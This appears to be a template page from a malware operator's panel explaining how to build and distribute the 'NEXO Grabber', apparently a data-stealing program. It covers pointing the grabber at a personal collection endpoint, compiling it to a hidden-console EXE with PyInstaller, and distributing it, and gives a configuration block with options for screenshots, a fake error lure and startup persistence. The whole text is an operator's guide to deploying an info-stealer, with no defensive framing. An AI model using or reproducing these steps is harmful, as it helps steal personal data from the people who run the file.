How to Build Your Grabber

Step 1: Get the Grabber Code

Download the NEXO Grabber from the GitHub repository or use the code provided in your panel folder.

Step 2: Configure API URL

Replace the API_URL in the grabber code with your personal endpoint:

{{ api_url }}

Step 3: Compile to EXE

Use PyInstaller to compile your grabber:

pyinstaller --onefile --noconsole grabber.py

Step 4: Distribute

Your compiled EXE is ready! All captured data will appear in your dashboard automatically.

Quick Setup Code

Add this to the top of your grabber to configure it for your panel: 

# NEXO Grabber Configuration
API_URL = "{{ api_url }}"
SEND_SCREENSHOT = True
FAKE_ERROR = False
ADD_TO_STARTUP = False

# The grabber will automatically send all data to your panel
